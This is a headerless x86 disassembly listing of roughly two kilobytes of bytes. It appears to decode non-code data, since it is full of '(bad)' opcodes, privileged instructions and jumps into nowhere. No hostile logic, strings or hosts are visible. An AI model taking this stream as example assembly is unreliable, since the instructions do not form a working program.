  432156:	in     eax,dx
  432157:	push   esp
  432158:	(bad)  
  432159:	inc    edx
  43215b:	sbb    al,0x33
  43215d:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432164:	add    BYTE PTR [ebp+0x46],0x8b
  432168:	jmp    0xf98b:0x100041c8
  43216f:	xor    esi,DWORD PTR [edx+0x3]
  432172:	mov    ecx,DWORD PTR [edi]
  432174:	fmul   DWORD PTR [edx]
  432176:	add    BYTE PTR [eax],al
  432178:	lea    eax,[ebx-0x4700273c]
  43217e:	add    al,0x4f
  432180:	pop    DWORD PTR [eax]
  432182:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432188:	push   edx
  432189:	inc    WORD PTR [ebp+0x8]
  43218d:	mov    eax,0x514f4d
  432192:	(bad)
  432196:	add    al,al
  432198:	xor    DWORD PTR [ebx-0x74baf730],eax
  43219e:	test   DWORD PTR [esi+0x74],esp
  4321a1:	inc    ebp
  4321a2:	mov    DWORD PTR [eax+0xa4e08],edi
  4321a8:	add    BYTE PTR [ecx-0x76c435bb],cl
  4321ae:	or     dh,cl
  4321b0:	or     eax,0x8b8d5045
  4321b5:	inc    ebp
  4321b6:	mov    WORD PTR [ecx+0x3b8a00],?
  4321bc:	jne    0x4321f1
  4321be:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4321c4:	add    DWORD PTR [ebx],eax
  4321c6:	add    bh,bh
  4321c8:	adc    DWORD PTR [eax],ecx
  4321ca:	adc    DWORD PTR [ebp+0x55],edi
  4321cd:	push   es
  4321ce:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4321d4:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4321db:	inc    ebp
  4321dc:	mov    esp,edi
  4321de:	or     al,0xda
  4321e0:	push   eax
  4321e1:	(bad)  
  4321e2:	jne    0x432198
  4321e4:	call   0x3b1ad3
  4321e9:	inc    ebp
  4321ea:	sar    BYTE PTR [eax],0x84
  4321ed:	in     al,dx
  4321ee:	add    bh,al
  4321f0:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  4321f7:	(bad)  
  4321f8:	and    al,al
  4321fa:	fs in  eax,dx
  4321fc:	inc    DWORD PTR [ebp-0x7b]
  4321ff:	jle    0x432210
  432201:	leave  
  432202:	scas   al,BYTE PTR es:[edi]
  432203:	inc    esp
  432204:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43220b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432212:	call   DWORD PTR [edi]
  432214:	shr    ah,0x84
  432217:	xchg   DWORD PTR [eax],eax
  432219:	add    DWORD PTR [eax],eax
  43221b:	add    bh,bh
  43221d:	dec    ebp
  43221e:	and    BYTE PTR [ecx-0x38],dl
  432221:	push   eax
  432222:	dec    DWORD PTR [ebx+0xfd885]
  432228:	mov    BYTE PTR [ebp+0x508bac00],cl
  43222e:	mov    WORD PTR [ecx+0x0],ss
  432231:	lea    ecx,[ebx+0x108b20d8]
  432237:	mov    WORD PTR [edx],ds
  432239:	add    BYTE PTR [edi+0xff01ff],al
  43223f:	mov    ecx,DWORD PTR [ebp-0x28]
  432242:	push   ecx
  432243:	shl    BYTE PTR [ebp+0x3a],0x8b
  432247:	inc    ebp
  432248:	in     al,0xeb
  43224a:	jno    0x4321d7
  43224c:	push   edx
  43224d:	mov    DWORD PTR [eax-0x28],edx
  432250:	mov    eax,DWORD PTR [ebp+0x20]
  432253:	je     0x4321dc
  432255:	mov    eax,DWORD PTR [ecx]
  432257:	sbb    BYTE PTR [eax],al
  432259:	pop    DWORD PTR [eax]
  43225b:	add    esi,eax
  43225d:	add    bl,al
  43225f:	adc    DWORD PTR [edi],esi
  432261:	jmp    0x8bce72b3
  432266:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  43226d:	jne    0x4321fa
  43226f:	mov    ecx,DWORD PTR [eax]
  432271:	in     al,0x75
  432273:	pop    DWORD PTR [ecx+0x5401]
  432279:	push   edx
  43227a:	inc    DWORD PTR [ebx]
  43227c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432282:	add    BYTE PTR [edi+0x9],dl
  432285:	call   DWORD PTR [esi]
  432287:	and    dl,al
  432289:	and    bh,bh
  43228b:	inc    edi
  43228d:	test   eax,edx
  43228f:	sldt   ebx
  432292:	xor    al,BYTE PTR [eax]
  432294:	pushf  
  432295:	(bad)  
  432296:	jmp    0x4322a4
  432298:	mov    eax,edi
  43229a:	or     al,0x75
  43229c:	inc    eax
  43229d:	call   0x4319a5
  4322a2:	mov    eax,eax
  4322a4:	loopne 0x43222a
  4322a6:	inc    ebp
  4322a7:	add    BYTE PTR [ebx+0x1451c00],cl
  4322ad:	mov    eax,DWORD PTR [ebp+0x20]
  4322b0:	add    edi,ecx
  4322b2:	add    BYTE PTR [eax],ch
  4322b4:	cmp    edi,0x18
  4322b7:	test   DWORD PTR [ebp+0xf],esi
  4322ba:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4322c1:	jne    0x4322c5
  4322c3:	call   0xffa21d88
  4322c8:	leave  
  4322c9:	rcr    BYTE PTR [esp+eax*4],0x55
  4322cd:	add    ah,ch
  4322cf:	add    BYTE PTR [edi-0x48fef979],dh
  4322d5:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4322dc:	inc    esp
  4322dd:	mov    ebx,DWORD PTR [eax]
  4322df:	fcom   st(2)
  4322e1:	add    BYTE PTR [edi],bl
  4322e3:	lea    ecx,[eax-0x18]
  4322e6:	(bad)  
  4322e7:	push   DWORD PTR [ecx]
  4322e9:	call   0xffb5704b
  4322ee:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4322f2:	fstp   DWORD PTR [esi+ebx*8]
  4322f5:	push   ebp
  4322f6:	pop    ebp
  4322f7:	mov    esi,DWORD PTR [edx-0x38]
  4322fa:	add    DWORD PTR [eax],0x28
  4322fd:	mov    edi,DWORD PTR [ebx]
  4322ff:	xor    esi,DWORD PTR [edx+0x3]
  432302:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432306:	pop    ebp
  432307:	or     al,0x4
  432309:	inc    ecx
  43230a:	push   ebp
  43230b:	(bad)  
  43230c:	in     al,dx
  43230d:	or     ah,ch
  43230f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432310:	xbegin 0xffc89906
  432316:	clc    
  432317:	adc    al,0x45
  432319:	div    BYTE PTR [edx]
  43231b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432322:	test   DWORD PTR [ebx+0x666300f8],ebx
  432328:	add    BYTE PTR [ecx+0x66],dh
  43232b:	add    eax,DWORD PTR [ebp+0x52]
  43232e:	adc    eax,0xffffffa0
  432331:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  432337:	test   DWORD PTR [eax],eax
  432339:	clc    
  43233a:	data16 or al,BYTE PTR [ebp+0x45]
  43233e:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432345:	rol    BYTE PTR [ebp+0x45],1
  432348:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  43234e:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432354:	push   ebx
  432355:	add    BYTE PTR [eax+eax*1+0x51],dl
  432359:	jge    0x43238e
  43235b:	add    BYTE PTR [esi+0x4],dl
  43235e:	jne    0x4323c5
  432360:	mov    edx,0x457200
  432365:	jmp    0x432329
  432367:	xor    edi,DWORD PTR [ebx]
  432369:	pop    edi
  43236a:	cvtdq2ps xmm7,xmm0
  43236d:	ret    0x0
  432370:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  432376:	xor    ecx,DWORD PTR [edi]
  432378:	add    eax,DWORD PTR [ecx+0x3b]
  43237b:	push   ebx
  43237c:	rdpmc  
  43237e:	out    0x8d,al
  432380:	add    BYTE PTR [eax],cl
  432382:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432388:	ret    0x450c
  43238b:	sbb    al,0x8b
  43238d:	cmp    eax,esi
  43238f:	or     cl,al
  432391:	or     al,0xc2
  432393:	pop    eax
  432394:	inc    ebp
  432395:	add    ecx,DWORD PTR [edi]
  432397:	add    esi,DWORD PTR [ebp+0x39]
  43239a:	invd   
  43239c:	jge    0x4323a8
  43239e:	mov    eax,0x478ac0
  4323a3:	cli    
  4323a4:	xor    esp,ecx
  4323a6:	mov    ebx,0x5b8ac0
  4323ab:	ret    0x33
  4323ae:	mov    eax,0x833b8b
  4323b3:	sub    BYTE PTR [ebx],al
  4323b5:	inc    ebp
  4323b6:	xor    ax,di
  4323b9:	pushf  
  4323ba:	inc    bh
  4323bc:	mov    esp,esp
  4323be:	hlt    
  4323bf:	test   DWORD PTR [ebp-0x8],esi
  4323c2:	mov    eax,DWORD PTR [ebp-0x14]
  4323c5:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4323cb:	dec    edi
  4323cc:	or     BYTE PTR [eax],al
  4323ce:	jne    0x432359
  4323d0:	mov    esi,esp
  4323d2:	call   0x77a9af97
  4323d7:	inc    ebp
  4323d8:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4323de:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4323e4:	add    BYTE PTR [esi+0x7d],ah
  4323e7:	inc    ebp
  4323e8:	mov    bx,WORD PTR [ebp+0x8]
  4323ec:	add    DWORD PTR [ebp+0x54],0x30c008b
  4323f3:	inc    ebp
  4323f4:	mov    bx,di
  4323f7:	lock test BYTE PTR [ecx+0x7000801],bh
  4323fe:	jge    0x4323c1
  432400:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432406:	cli    
  432407:	xor    bl,bh
  432409:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43240f:	test   BYTE PTR [eax],cl
  432411:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432418:	cmp    ebp,eax
  43241a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432421:	test   BYTE PTR [ebp+0x1],bh
  432424:	mov    ebx,0x458a00
  432429:	xor    esi,DWORD PTR [ebx]
  43242b:	add    esp,DWORD PTR [esi-0x77]
  43242e:	pop    ebp
  43242f:	loopne 0x432497
  432431:	inc    ebp
  432432:	clc    
  432433:	xor    edi,DWORD PTR [ebx]
  432435:	add    esi,DWORD PTR [edx-0x77]
  432438:	data16 fdivr QWORD PTR [ebp-0x49]
  43243c:	mov    ebx,0xb78afc
  432441:	hlt    
  432442:	xor    edi,DWORD PTR [esi+eiz*2]
  432445:	add    BYTE PTR [ebp+0x66],bl
  432448:	data16 lock clc 
  43244b:	cmp    al,0x3b
  43244d:	add    BYTE PTR [edi+0x66],dh
  432450:	psubq  mm7,QWORD PTR [ebp+0x2]
  432454:	ltr    WORD PTR [ebp+0x66]
  432458:	add    esi,eax
  43245a:	add    di,WORD PTR [ebp+0x2b]
  43245e:	data16 data16 jge 0x4324df
  432462:	mov    ebx,0xe08a8b
  432467:	jge    0x43249c
  432469:	data16 data16 xor al,0x5d
  43246d:	data16 data16 jne 0x432469
  432471:	mov    edi,DWORD PTR [ebx]
  432473:	fdiv   QWORD PTR [edx+0x7d]
  432476:	data16 data16 jge 0x4324ae
  43247a:	mov    ebx,0x758a66
  43247f:	mov    esi,0x667233
  432484:	pop    ebp
  432485:	or     BYTE PTR [esi+0x0],ah
  432488:	clc    
  432489:	mov    edi,DWORD PTR [ebx]
  43248b:	lock ja 0x432419
  43248e:	(bad)  
  432490:	jge    0x432489
  432492:	invd   
  432494:	pop    ebp
  432495:	add    BYTE PTR [ebx],al
  432497:	(bad)  
  432498:	cmp    di,WORD PTR [ebp+0xf]
  43249c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4324a0:	mov    bx,WORD PTR [ebp-0x10]
  4324a4:	pop    bp
  4324a6:	fbstp  TBYTE PTR [ebx]
  4324a8:	test   DWORD PTR [ebx],eax
  4324aa:	add    BYTE PTR [ebx],bh
  4324ac:	add    BYTE PTR [esi+0x7d],ah
  4324af:	jge    0x43243c
  4324b1:	data16 in al,dx
  4324b3:	pop    ebp
  4324b4:	stc    
  4324b5:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4324bc:	mov    edi,ebx
  4324be:	in     al,dx
  4324bf:	test   BYTE PTR [ebp+0x0],bh
  4324c2:	mov    eax,DWORD PTR [eax]
  4324c4:	call   0xbd401e54
  4324c9:	cmp    al,0x9b
  4324cb:	add    BYTE PTR [edx],dh
  4324cd:	mov    bx,di
  4324d0:	call   0x8b4ba260
  4324d5:	add    ebp,esp
  4324d7:	mov    bx,di
  4324da:	jnp    0x432502
  4324dc:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4324e2:	mov    eax,DWORD PTR [eax]
  4324e4:	call   0x7c3eb04f
  4324e9:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4324ef:	data16 data16 fistp WORD PTR [ebp+0xe]
  4324f4:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  4324fe:	fisttp WORD PTR [ecx-0x7401f77b]
  432504:	(bad)  
  432505:	cld    
  432506:	jne    0x432544
  432508:	xor    eax,DWORD PTR [eax]
  43250a:	mov    esp,DWORD PTR [esi-0x10]
  43250d:	sti    
  43250e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432515:	data16 adc bl,bh
  432518:	push   ebp
  432519:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432520:	mov    WORD PTR [eax],es
  432522:	fwait
  432523:	data16 xor bh,bl
  432526:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  43252c:	mov    esp,DWORD PTR [esi-0x14]
  43252f:	fisttp WORD PTR [ebx-0x3748a9f2]
  432535:	or     al,0x2b
  432537:	mov    bh,0xba
  432539:	hlt    
  43253a:	mov    bh,bl
  43253c:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432542:	dec    esi
  432543:	or     al,0x0
  432545:	mov    edi,DWORD PTR [ebx]
  432547:	or     BYTE PTR [ebp+0x3b],dh
  43254a:	mov    ecx,DWORD PTR [edi]
  43254c:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432552:	xor    al,0xd8
  432554:	pop    bp
  432556:	lock xor esi,DWORD PTR [ebx]
  432559:	lea    esp,[esi+0x1f]
  43255c:	icebp  
  43255d:	jb     0x432563
  43255f:	add    al,al
  432561:	jge    0x43256f
  432563:	mov    eax,eax
  432565:	fsubr  st,st(3)
  432567:	pop    ebp
  432568:	mov    esi,DWORD PTR [ebx]
  43256a:	in     al,0x8d
  43256c:	rcr    DWORD PTR [edi],0xc2
  43256f:	jb     0x4325cf
  432571:	add    cl,cl
  432573:	jge    0x432581
  432575:	mov    edx,DWORD PTR [ebp-0x20]
  432578:	in     al,dx
  432579:	pop    ebp
  43257a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  43257f:	cmp    di,WORD PTR [ebp+0x0]
  432583:	mov    ebp,DWORD PTR [ebx]
  432585:	fdivr  QWORD PTR [esi+0x668a5d]
  43258b:	cmp    al,0x33
  43258d:	mov    si,0x4e7d
  432591:	mov    eax,DWORD PTR [eax]
  432593:	lock inc ebp
  432595:	mov    esi,DWORD PTR [eax]
  432597:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43259e:	clc    
  43259f:	(bad)  
  4325a0:	cmp    edi,DWORD PTR [ebx]
  4325a2:	je     0x4325b3
  4325a4:	push   ebx
  4325a5:	loopne 0x4325b6
  4325a7:	dec    ecx
  4325a9:	mov    esp,DWORD PTR [ebp-0x1c]
  4325ac:	int    0xf1
  4325ae:	mov    esi,0x703084d
  4325b3:	pcmpgtd mm6,mm1
  4325b6:	add    BYTE PTR [ebp+0x66],dh
  4325b9:	jmp    0x432586
  4325bb:	mov    eax,DWORD PTR [ebx]
  4325bd:	lock push ebp
  4325bf:	ror    DWORD PTR [ebp-0x2972feb3],1
  4325c5:	or     bh,dl
  4325c7:	jb     0x4325c7
  4325c9:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4325cf:	loopne 0x4325d1
  4325d1:	jne    0x4325d5
  4325d3:	data16 add BYTE PTR [esi+eiz*2],dh
  4325d7:	mov    ecx,ebx
  4325d9:	data16 cmp al,0xf1
  4325dc:	add    BYTE PTR [esi+eiz*2],bh
  4325df:	add    bl,cl
  4325e1:	retw   0xf2
  4325e5:	ret    0x66
  4325e8:	retf   
  4325e9:	enterw 0x4df1,0x19
  4325ee:	pop    edi
  4325ef:	jne    0x432572
  4325f1:	mov    esi,DWORD PTR [eax]
  4325f3:	call   0x77b7b194
  4325f8:	xor    ebp,DWORD PTR [ebx]
  4325fa:	lea    esp,[esi+0x48]
  4325fd:	repnz in eax,0x3b
  432600:	add    BYTE PTR [ebp-0x37],dh
  432603:	xor    edx,DWORD PTR [ebp-0x15]
  432606:	in     al,dx
  432607:	xor    edx,DWORD PTR [esi+0x40]
  43260a:	mov    DWORD PTR [edi],0x338545fc
  432610:	clc    
  432611:	add    esi,DWORD PTR [ecx]
  432613:	pop    edi
  432614:	pushf  
  432615:	pop    ebx
  432616:	call   0xff4425dd
  43261b:	mov    edi,eax
  43261d:	push   ecx
  43261e:	pop    es
  43261f:	mov    edi,DWORD PTR [eax]
  432621:	push   esi
  432622:	inc    esi
  432623:	add    bh,BYTE PTR [esi+0x0]
  432626:	popa   
  432627:	data16 (bad) 
  432629:	into   
  43262a:	gs cmp al,0xcd
  43262d:	add    BYTE PTR [ecx+0x7ce0866],bh
  432633:	ret    0x66
  432636:	add    bh,al
  432638:	add    bh,ah
  43263a:	add    BYTE PTR [ebp+0x31c3f866],al
  432640:	cmp    al,0x9c
  432642:	add    BYTE PTR [esi+0x66],ah
  432645:	into   
  432646:	ret    
  432647:	pop    ebp
  432648:	adc    BYTE PTR [edi+0x0],dl
  43264b:	mov    bh,0x66
  43264d:	mov    edi,0xff038dc3
  432652:	jne    0x4326a8
  432654:	lea    edx,[ecx+0x1]
  432657:	mov    ebx,0xd64ff1
  43265c:	sar    DWORD PTR [ebx],1
  43265e:	test   BYTE PTR [ebp+0x36],dh
  432661:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432665:	push   edi
  432666:	xor    BYTE PTR [ebx],0x38
  432669:	mov    esi,ebx
  43266b:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432671:	ss inc ebp
  432673:	fs pop ebx
  432675:	mov    ebx,0x9c3b30
  43267a:	je     0x4326a7
  43267c:	xor    edi,DWORD PTR [ebx+0x668a33]
  432682:	mov    WORD PTR [ebx],?
  432684:	ss mov ebx,0x8b4e64
  43268a:	pop    edi
  43268b:	cmp    ecx,ecx
  43268d:	jne    0x4326e4
  43268f:	mov    ebp,esp
  432691:	cld    
  432692:	push   esi
  432693:	pop    ebx
  432694:	inc    ebp
  432695:	stc    
  432696:	xor    BYTE PTR [ebp+0x9bef89c],al
  43269c:	test   esi,ecx
  43269e:	clc    
  43269f:	test   dl,dl
  4326a1:	cmp    bh,bh
  4326a3:	fs pop si
  4326a6:	or     bl,al
  4326a8:	add    cl,BYTE PTR [ebx+0x57665100]
  4326ae:	retf   0x3c45
  4326b1:	xor    BYTE PTR [eax],al
  4326b3:	pushf  
  4326b4:	mov    si,0x85ca
  4326b8:	ret    0xf8
  4326bb:	pop    ebx
  4326bc:	dec    dx
  4326bf:	mov    edx,DWORD PTR [edi-0x76]
  4326c2:	push   edi
  4326c3:	add    al,0xb7
  4326c5:	xor    al,0xba
  4326c7:	cmp    al,0x8d
  4326c9:	je     0x4326ca
  4326cb:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4326cf:	lea    edi,[ebx+0x544fff]
  4326d5:	push   ecx
  4326d6:	cmp    edx,DWORD PTR [ebx+0x75]
  4326d9:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4326df:	add    BYTE PTR [ebx],dh
  4326e1:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4326e7:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  4326ee:	mov    ebx,0x3b3b00
  4326f3:	jne    0x432720
  4326f5:	mov    DWORD PTR [ebx+0x728afc],edi
  4326fb:	xor    esi,DWORD PTR [ebx]
  4326fd:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432703:	push   edi
  432704:	cmp    esp,ebp
  432706:	jne    0x432708
  432708:	sbb    DWORD PTR [eax],0x8085c3fc
  43270e:	clc    
  43270f:	inc    esi
  432710:	pop    ebx
  432711:	sti    
  432712:	add    eax,0xeb8bc075
  432717:	cld    
  432718:	xor    edi,DWORD PTR ds:0xf8c3855e
  43271e:	mov    ecx,DWORD PTR [ecx+edx*2]
  432721:	rol    DWORD PTR [ebp-0x37],0xf
  432725:	mov    DWORD PTR [eax],ecx
  432727:	inc    edi
  432728:	(bad)  
  432729:	in     eax,0xfe
  43272b:	add    bh,bh
  43272d:	(bad)  
  43272e:	mov    esi,0xc38a5e
  432733:	mov    esi,DWORD PTR [ebx]
  432735:	push   ecx
  432736:	mov    edi,0xfc4ec7
  43273b:	test   DWORD PTR [ebp-0x8],edx
  43273e:	xor    di,ax
  432741:	pushf  
  432742:	sub    ebp,eax
  432744:	inc    ebp
  432745:	(bad)  
  432746:	sub    edi,edi
  432748:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  43274e:	inc    ebp
  43274f:	add    BYTE PTR [esi+0x2b],ah
  432752:	or     bh,BYTE PTR [edx+0xf8ac2]
  432758:	cmp    al,0x33
  43275a:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432760:	(bad)  
  432761:	cmp    esi,DWORD PTR [ebx]
  432763:	je     0x43271d
  432765:	push   ebx
  432766:	dec    esi
  432767:	str    ecx
  43276a:	cmp    esp,DWORD PTR [ebp+0x75]
  43276d:	int    0x33
  43276f:	mov    edi,0x789085f
  432774:	mov    edx,DWORD PTR [eax]
  432776:	cld    
  432777:	add    cl,cl
  432779:	data16 add al,0xcb
  43277c:	push   ebp
  43277d:	add    ebp,esp
  43277f:	jne    0x43276d
  432781:	(bad)  
  432782:	mov    DWORD PTR [ecx],0xd685f7ec
  432788:	clc    
  432789:	xlat   BYTE PTR ds:[ebx]
  43278a:	inc    ebp
  43278b:	mov    esi,DWORD PTR [edx]
  43278d:	push   eax
  43278e:	pushf  
  43278f:	in     eax,0x8b
  432791:	add    ah,ch
  432793:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432797:	add    ax,0x72cb
  43279b:	cmp    al,0x0
  43279d:	add    BYTE PTR [ebp+0x66],al
  4327a0:	(bad)  
  4327a1:	retf   
  4327a2:	lock ret 0x85
  4327a6:	clc    
  4327a7:	inc    bp
  4327a9:	retf   
  4327aa:	cmp    eax,0xc77d9cc8
  4327af:	xor    ah,bh
  4327b1:	pushf  
  4327b2:	test   DWORD PTR [edi-0x8],ebx
  4327b5:	je     0x4327fc
  4327b7:	xor    esi,DWORD PTR ds:0x7020840
  4327bd:	ror    BYTE PTR [ebp-0x37],0x8d
  4327c1:	push   ebp
  4327c2:	add    esp,ebp
  4327c4:	jb     0x432751
  4327c6:	add    BYTE PTR [eax],cl
  4327c8:	dec    ebp
  4327c9:	mov    bh,0x81
  4327cb:	push   esi
  4327cc:	push   esp
  4327cd:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4327d4:	xor    al,BYTE PTR [eax]
  4327d6:	mov    edx,DWORD PTR [edi+0x10]
  4327d9:	(bad)  
  4327da:	scas   eax,DWORD PTR es:[edi]
  4327db:	ret    0x3b
  4327de:	jns    0x3b4424d1
  4327e4:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4327e8:	dec    ebp
  4327e9:	or     BYTE PTR [ebx],ch
  4327eb:	ret    0x458b
  4327ee:	lock jmp 0x4327e2
  4327f1:	mov    ecx,DWORD PTR [eax]
  4327f3:	or     BYTE PTR [edi],al
  4327f5:	mov    ecx,eax
  4327f7:	xor    DWORD PTR [edx+0x2],0x0
  4327fb:	mov    bh,0xc1
  4327fd:	adc    BYTE PTR [eax],dh
  4327ff:	iret   
  432800:	inc    ebp
  432801:	mov    DWORD PTR [ebx],0x4dfff8c4
  432807:	inc    BYTE PTR [ebx]
  432809:	ret    0xf8
  43280c:	adc    DWORD PTR [esi+0x10],esp
  43280f:	clc    
  432810:	dec    ecx
  432811:	fisttp WORD PTR [ecx+0x456604c0]
  432817:	add    dh,BYTE PTR ds:0x75e0845
  43281d:	ret    0x4d
  432820:	lea    ecx,[ebx+0x18728301]
  432826:	add    BYTE PTR [ebp+0x45],al
  432829:	xor    ecx,ebp
  43282b:	pushf  
  43282c:	add    bh,al
  43282e:	add    al,ch
  432830:	inc    ebp
  432831:	test   DWORD PTR [ebx-0x3eba0708],ecx
  432837:	xor    eax,0x781084d
  43283c:	push   esp
  43283d:	fwait
  43283e:	push   ecx
  43283f:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432845:	inc    ebp
  432846:	cmp    edi,DWORD PTR [ecx]
  432848:	jbe    0x4327e6
  43284a:	mov    eax,edi
  43284c:	or     ah,dh
  43284e:	inc    ebp
  43284f:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432855:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43285b:	in     al,dx
  43285c:	hlt    
  43285d:	push   esp
  43285e:	push   esp
  43285f:	push   ecx
  432860:	push   ecx
  432861:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  432867:	fwait
  432868:	fwait
  432869:	xor    dh,BYTE PTR [edx]
  43286b:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432871:	or     BYTE PTR [ebp+0x7],al
  432874:	mov    eax,ecx
  432876:	clc    
  432877:	jb     0x43283a
  432879:	add    BYTE PTR [ebp+0x55],cl
  43287c:	or     DWORD PTR [edi],0xc251d154
  432882:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  43288c:	mov    edi,eax
  43288e:	or     cl,al
  432890:	inc    ebp
  432891:	dec    ebp
  432892:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432898:	or     WORD PTR [ecx],0x899b
  43289d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4328a3:	mov    edx,DWORD PTR [ecx+0x8]
  4328a6:	mov    eax,DWORD PTR [ebp-0x8]
  4328a9:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4328b0:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4328b6:	inc    ebp
  4328b7:	dec    eax
  4328b8:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4328be:	add    edx,DWORD PTR [ecx-0x8]
  4328c1:	mov    ecx,DWORD PTR [ecx]
  4328c3:	clc    
  4328c4:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4328cb:	mov    ecx,ebp
  4328cd:	clc    
  4328ce:	(bad)  
  4328cf:	popf   
  4328d0:	inc    DWORD PTR [eax]
  4328d2:	ret    0x8b
  4328d5:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4328db:	mov    edi,esp
  4328dd:	hlt    
  4328de:	test   ecx,esi
  4328e0:	clc    
  4328e1:	or     BYTE PTR [ebp+0x7],al
  4328e4:	xor    al,cl
  4328e6:	pushf  
  4328e7:	jb     0x43291c
  4328e9:	add    BYTE PTR [eax-0x3f],al
  4328ec:	inc    eax
  4328ed:	daa    
  4328ee:	inc    ebp
  4328ef:	inc    ebp
  4328f0:	xor    eax,0x7f80803
  4328f5:	dec    ebp
  4328f6:	fwait
  4328f7:	add    esi,DWORD PTR [edx]
  4328f9:	clc    
  4328fa:	cmp    DWORD PTR [ecx],ecx
  4328fc:	or     al,0x8
  4328fe:	add    al,BYTE PTR [ebp+0x2c]
  432901:	xor    eax,0x7350845
  432906:	or     BYTE PTR [ebp+0x7],cl
  432909:	lea    ebx,[ebx-0x748dcdff]
  43290f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432916:	mov    edx,DWORD PTR [eax]
  432918:	cld    
  432919:	dec    ebp
  43291a:	push   esp
  43291b:	sub    edx,DWORD PTR [ecx-0x75]
  43291e:	add    eax,0xf172fc
  432923:	or     BYTE PTR [ebp+0x7],cl
  432926:	add    eax,ecx
  432928:	or     al,0x72
  43292a:	add    DWORD PTR [eax],eax
  43292c:	mov    ebx,0x29c2c1
  432931:	inc    ebp
  432932:	mov    eax,DWORD PTR [ebx]
  432934:	cmp    eax,0x3004d1c
  43293a:	xbegin 0x66c8b534
  432940:	clc    
  432941:	or     BYTE PTR [ebp+0x45],al
  432944:	xor    dh,BYTE PTR ds:0x78b089c
  43294a:	adc    BYTE PTR [ebp+0x45],cl
  43294d:	lea    eax,[ebp+0x33727501]
  432953:	add    cl,ch
  432955:	inc    ebp
  432956:	add    bl,ch
  432958:	add    BYTE PTR [ebx+0x45850845],cl
  43295e:	je     0x4328eb
  432960:	push   ebx
  432961:	or     al,0x85
  432963:	dec    ebp
  432964:	std    
  432965:	mov    bh,bh
  432967:	mov    BYTE PTR [ebp-0x75],al
  43296a:	mov    edi,eax
  43296c:	or     al,0x89
  43296e:	inc    ebp
  43296f:	clc    
  432970:	mov    esp,esp
  432972:	hlt    
  432973:	call   DWORD PTR [edi-0x37]
  432976:	push   esp
  432977:	or     al,0x51
  432979:	push   ebp
  43297a:	xor    ebp,esp
  43297c:	mov    esi,0x457251
  432981:	xor    esi,eax
  432983:	pushf  
  432984:	inc    ebp
  432985:	(bad)  
  432986:	mov    edi,eax
  432988:	or     al,0x85
  43298a:	add    al,bh
  43298c:	inc    eax
  43298e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432992:	or     ah,bh
  432994:	inc    eax
  432995:	push   esp
  432996:	jmp    0x4329e9
  432998:	mov    eax,DWORD PTR ds:0xe8720c
  43299e:	mov    DWORD PTR [ebp-0x8],eax
  4329a1:	jne    0x4329e8
  4329a3:	jmp    0x432930
  4329a5:	mov    ebp,DWORD PTR [eax]
  4329a7:	clc    
